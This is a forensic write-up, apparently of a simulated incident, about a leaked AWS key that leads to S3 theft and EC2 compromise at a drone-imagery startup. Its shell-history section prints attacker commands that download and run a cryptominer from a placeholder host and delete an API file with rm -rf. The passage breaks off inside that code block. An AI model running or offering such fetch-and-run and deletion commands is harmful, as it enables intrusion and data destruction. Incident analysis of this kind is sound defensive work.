# DroneCropForensics – Deep-Dive Investigation Notes

---

## Initial Discovery & Context

During routine threat hunting across public repositories, a critical security incident was simulated involving an AgriTech startup leveraging drone technology to capture and process aerial crop imagery.

A `.env` file containing hardcoded AWS credentials was accidentally committed to a developer’s GitHub repository and remained exposed long enough to be harvested by an opportunistic threat actor.

This incident simulation explores the full kill chain — from credential exposure to cloud compromise, data exfiltration, and service disruption.

The logs were collected from AWS CloudTrail, EC2 SSH sessions, shell command history, and internal drone API access logs to reconstruct the sequence of attacker actions.

---

## Indicators of Compromise (IOCs)

| Indicator              | Type       | Description                               |
|------------------------|------------|-------------------------------------------|
| `91.203.119.5`         | IP Address | Attacker’s origin IP used for API and SSH access |
| `AKIA1234FAKEKEYYO`    | AWS Key    | Leaked AWS secret key (redacted)         |
| `dronecrop-images`     | S3 Bucket  | Targeted for crop data exfiltration       |
| `/var/www/html/api/upload.php` | File Path  | API endpoint deleted by attacker          |
| `cryptominer.tar.gz`   | Artifact   | Suspected malware dropped onto EC2        |

---

## Log Analysis Summary

### 1. `aws_cloudtrail.log`

This log revealed unauthorized usage of AWS APIs by a rogue user (`h4ck3r`) from IP `91.203.119.5`:

- **`GetObject`** events on the `dronecrop-images` S3 bucket confirm the adversary successfully exfiltrated sensitive agricultural imagery.

- **`DescribeInstances`** and **`StartInstances`** calls indicate enumeration of EC2 instances and remote activation of a dormant node — a precursor to interactive access via SSH.

These events clearly align with **stage 2: cloud enumeration** and **stage 3: privilege abuse** in the MITRE ATT&CK cloud matrix.

---

### 2. `auth.log`

The SSH authentication log shows a successful key-based login from the attacker’s IP. The use of public key auth suggests the attacker may have injected their key into the instance via the AWS control plane after compromise.

- **Login timestamp:** 2025-07-12 05:07 UTC

- **Session opened using root-level key for user `ubuntu`**

- **Session duration:** ~4 minutes

This session created the foothold necessary for persistent backdoor access and payload delivery.

---

### 3. `shell_history.log`

Shell commands executed during the session confirm execution of a mining payload:

```bash
wget http://badsite.example.com/cryptominer.tar.gz
tar -xvzf cryptominer.tar.gz
cd miner
chmod +x run.sh
./run.sh
rm -rf /var/www/html/api/upload.php
